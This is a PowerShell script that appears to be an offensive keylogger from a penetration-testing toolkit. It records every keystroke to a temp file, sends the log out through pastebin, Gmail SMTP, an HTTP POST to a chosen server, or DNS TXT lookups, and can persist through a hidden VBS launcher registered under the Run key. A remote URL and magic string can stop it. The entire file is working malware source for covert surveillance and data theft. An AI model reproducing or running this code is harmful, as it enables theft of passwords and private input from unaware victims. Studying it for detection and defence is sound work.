

    [CmdletBinding(DefaultParameterSetName="noexfil")] Param( 
        [Parameter(Parametersetname="exfil")]
        [Switch]
        $persist,

        [Parameter(Parametersetname="exfil")]
        [Switch]
        $exfil,

        [Parameter(Position = 0, Mandatory = $True, Parametersetname="exfil")]
        [Parameter(Position = 0, Mandatory = $True, Parametersetname="noexfil")]
        [String]
        $CheckURL,

        [Parameter(Position = 1, Mandatory = $True, Parametersetname="exfil")]
        [Parameter(Position = 1, Mandatory = $True, Parametersetname="noexfil")]
        [String]
        $MagicString,

        [Parameter(Position = 2, Mandatory = $False, Parametersetname="exfil")] [ValidateSet("gmail","pastebin","WebServer","DNS")]
        [String]
        $ExfilOption,

        [Parameter(Position = 3, Mandatory = $False, Parametersetname="exfil")] 
        [String]
        $dev_key = "null",

        [Parameter(Position = 4, Mandatory = $False, Parametersetname="exfil")]
        [String]
        $username = "null",

        [Parameter(Position = 5, Mandatory = $False, Parametersetname="exfil")]
        [String]
        $password = "null",

        [Parameter(Position = 6, Mandatory = $False, Parametersetname="exfil")]
        [String]
        $URL = "null",
      
        [Parameter(Position = 7, Mandatory = $False, Parametersetname="exfil")]
        [String]
        $DomainName = "null",

        [Parameter(Position = 8, Mandatory = $False, Parametersetname="exfil")]
        [String]
        $AuthNS = "null"   
   
    )



$functions =  {

function script:qeybog
{
    Param ( 
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $MagicString,

        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $CheckURL
    )
    
    $signature = @" 
    [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
    public static extern short GetAsyncKeyState(int virtualKeyCode); 
"@ 
    $getKeyState = Add-Type -memberDefinition $signature -name "Newtype" -namespace newnamespace -passThru 
    $check = 0
    while ($true) 
    { 
        Start-Sleep -Milliseconds 40 
        $logged = "" 
        $result="" 
        $shift_state="" 
        $caps_state="" 
        for ($char=1;$char -le 254;$char++) 
        { 
            $vkey = $char 
            $logged = $getKeyState::GetAsyncKeyState($vkey) 
            if ($logged -eq -32767) 
            { 
                if(($vkey -ge 48) -and ($vkey -le 57)) 
                { 
                    $left_shift_state = $getKeyState::GetAsyncKeyState(160) 
                    $right_shift_state = $getKeyState::GetAsyncKeyState(161) 
                        if(($left_shift_state -eq -32768) -or ($right_shift_state -eq -32768)) 
                        { 
                            $result = "S-" + $vkey 
                        } 
                        else 
                        { 
                            $result = $vkey 
                        } 
                    } 
                elseif(($vkey -ge 64) -and ($vkey -le 90)) 
                { 
                    $left_shift_state = $getKeyState::GetAsyncKeyState(160) 
                    $right_shift_state = $getKeyState::GetAsyncKeyState(161) 
                    $caps_state = [console]::CapsLock 
                    if(!(($left_shift_state -eq -32768) -or ($right_shift_state -eq -32768)) -xor $caps_state) 
                    { 
                        $result = "S-" + $vkey 
                    } 
                    else 
                    { 
                        $result = $vkey 
                    } 
                } 
                elseif((($vkey -ge 186) -and ($vkey -le 192)) -or (($vkey -ge 219) -and ($vkey -le 222))) 
                { 
                    $left_shift_state = $getKeyState::GetAsyncKeyState(160) 
                    $right_shift_state = $getKeyState::GetAsyncKeyState(161) 
                    if(($left_shift_state -eq -32768) -or ($right_shift_state -eq -32768)) 
                    { 
                        $result = "S-" + $vkey 
                    } 
                    else 
                    { 
                      $result = $vkey 
                    } 
                } 
                else 
                { 
                    $result = $vkey 
                } 
                $now = Get-Date; 
                $logLine = "$result " 
                $filename = "$env:temp\citr.log" 
                Out-File -FilePath $fileName -Append -InputObject "$logLine" 

            }
        }
        $check++
        if ($check -eq 6000)
        {
            $webclient = New-Object System.Net.WebClient
            $filecontent = $webclient.DownloadString("$CheckURL")
            if ($filecontent -eq $MagicString)
            {
                break
            }
            $check = 0
        }
    }
}

    function Keypaste
    {
        Param ( 
            [Parameter(Position = 0, Mandatory = $True)]
            [String]
            $ExfilOption,
        
            [Parameter(Position = 1, Mandatory = $True)]
            [String]
            $dev_key,
        
            [Parameter(Position = 2, Mandatory = $True)]
            [String]
            $username,

            [Parameter(Position = 3, Mandatory = $True)]
            [String]
            $password,
        
            [Parameter(Position = 4, Mandatory = $True)]
            [String]
            $URL,

            [Parameter(Position = 5, Mandatory = $True)]
            [String]
            $AuthNS,

            [Parameter(Position = 6, Mandatory = $True)]
            [String]
            $MagicString,
        
            [Parameter(Position = 7, Mandatory = $True)]
            [String]
            $CheckURL
        )

        $check = 0
        while($true) 
        { 
            $read = 0
            Start-Sleep -Seconds 15 
            $pastevalue=Get-Content $env:temp\citr.log 
            $read++
            if ($read -eq 30)
            {
                Out-File -FilePath $env:temp\citr.log -Force -InputObject " " 
                $read = 0
            }
            $now = Get-Date; 
            $name = $env:COMPUTERNAME 
            $pastename = $name + "" + $now.ToUniversalTime().ToString("dd/MM/yyyy HH:mm:ss:fff")
            function post_http($url,$parameters) 
            {
                $http_request = New-Object -ComObject Msxml2.XMLHTTP 
                $http_request.open("POST", $url, $false) 
                $http_request.setRequestHeader("Content-type","application/x-www-form-urlencoded") 
                $http_request.setRequestHeader("Content-length", [String]$parameters.length); 
                $http_request.setRequestHeader("Connection", "close") 
                $http_request.send([String]$parameters) 
                $script:session_key=$http_request.responseText 
            } 

            function Compress-Encode
            {
                #Compression logic from http://www.darkoperator.com/blog/2013/3/21/powershell-basics-execution-policy-and-code-signing-part-2.html
                $ms = New-Object IO.MemoryStream
                $action = [IO.Compression.CompressionMode]::Compress
                $cs = New-Object IO.Compression.DeflateStream ($ms,$action)
                $sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII)
                $pastevalue | ForEach-Object {$sw.WriteLine($_)}
                $sw.Close()
                # Base64 encode stream
                $code = [Convert]::ToBase64String($ms.ToArray())
                return $code
            }

            if ($exfiloption -eq "pastebin")
            {
                $utfbytes  = [System.Text.Encoding]::UTF8.GetBytes($Data)
                $pastevalue = [System.Convert]::ToBase64String($utfbytes)
                post_http "https://pastebin.com/api/api_login.php" "api_dev_key=$dev_key&api_user_name=$username&api_user_password=$password" 
                post_http "https://pastebin.com/api/api_post.php" "api_user_key=$session_key&api_option=paste&api_dev_key=$dev_key&api_paste_name=$pastename&api_paste_code=$pastevalue&api_paste_private=2" 
            }
        
            elseif ($exfiloption -eq "gmail")
            {
                #http://stackoverflow.com/questions/1252335/send-mail-via-gmail-with-powershell-v2s-send-mailmessage
                $smtpserver = "smtp.gmail.com"
                $msg = new-object Net.Mail.MailMessage
                $smtp = new-object Net.Mail.SmtpClient($smtpServer )
                $smtp.EnableSsl = $True
                $smtp.Credentials = New-Object System.Net.NetworkCredential("$username", "$password");
                $msg.From = "$username@gmail.com"
                $msg.To.Add("$username@gmail.com")
                $msg.Subject = $pastename
                $msg.Body = $pastevalue
                if ($filename)
                {
                    $att = new-object Net.Mail.Attachment($filename)
                    $msg.Attachments.Add($att)
                }
                $smtp.Send($msg)
            }

            elseif ($exfiloption -eq "webserver")
            {
                $Data = Compress-Encode    
                post_http $URL $Data
            }
            elseif ($ExfilOption -eq "DNS")
            {
                $lengthofsubstr = 0
                $code = Compress-Encode
                $queries = [int]($code.Length/63)
                while ($queries -ne 0)
                {
                    $querystring = $code.Substring($lengthofsubstr,63)
                    Invoke-Expression "nslookup -querytype=txt $querystring.$DomainName $ExfilNS"
                    $lengthofsubstr += 63
                    $queries -= 1
                }
                $mod = $code.Length%63
                $query = $code.Substring($code.Length - $mod, $mod)
                Invoke-Expression "nslookup -querytype=txt $query.$DomainName $ExfilNS"

            }

            $check++
            if ($check -eq 6000)
            {
                $check = 0
                $webclient = New-Object System.Net.WebClient
                $filecontent = $webclient.DownloadString("$CheckURL")
                if ($filecontent -eq $MagicString)
                {
                    break
                }
            }
        }
    }
}



    $modulename = $script:MyInvocation.MyCommand.Name
    if($persist -eq $True)
    {
        $name = "persist.vbs" 
        $options = "start-job -InitializationScript `$functions -scriptblock {Keypaste $args[0] $args[1] $args[2] $args[3] $args[4] $args[5] $args[6] $args[7]} -ArgumentList @($ExfilOption,$dev_key,$username,$password,$URL,$AuthNS,$MagicString,$CheckURL)"
        $options2 = "start-job -InitializationScript `$functions -scriptblock {qeybog $args[0] $args[1]} -ArgumentList @($MagicString,$CheckURL)"
        $func = $functions.Tostring()
        Out-File -InputObject '$functions =  {' -Force $env:TEMP\$modulename
        Out-File -InputObject $func -Append $env:TEMP\$modulename
        Out-File -InputObject '}' -Append -NoClobber $env:TEMP\$modulename
        Out-File -InputObject $options -Append -NoClobber $env:TEMP\$modulename
        Out-File -InputObject $options2 -Append -NoClobber $env:TEMP\$modulename
           
        New-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Update -PropertyType String -Value $env:TEMP\$name -force
        echo "Set objShell = CreateObject(`"Wscript.shell`")" > $env:TEMP\$name
        echo "objShell.run(`"powershell -noexit -WindowStyle Hidden -executionpolicy bypass -file $env:temp\$modulename`")" >> $env:TEMP\$name

    }  

    else
    {
        if ($exfil -eq $True)
        {
            start-job -InitializationScript $functions -scriptblock {Keypaste $args[0] $args[1] $args[2] $args[3] $args[4] $args[5] $args[6] $args[7]} -ArgumentList @($ExfilOption,$dev_key,$username,$password,$URL,$AuthNS,$MagicString,$CheckURL)
            start-job -InitializationScript $functions -scriptblock {qeybog $args[0] $args[1]} -ArgumentList @($MagicString,$CheckURL)
        }
        else
        {
            start-job -InitializationScript $functions -scriptblock {qeybog $args[0] $args[1]} -ArgumentList @($MagicString,$CheckURL)
        }
    }
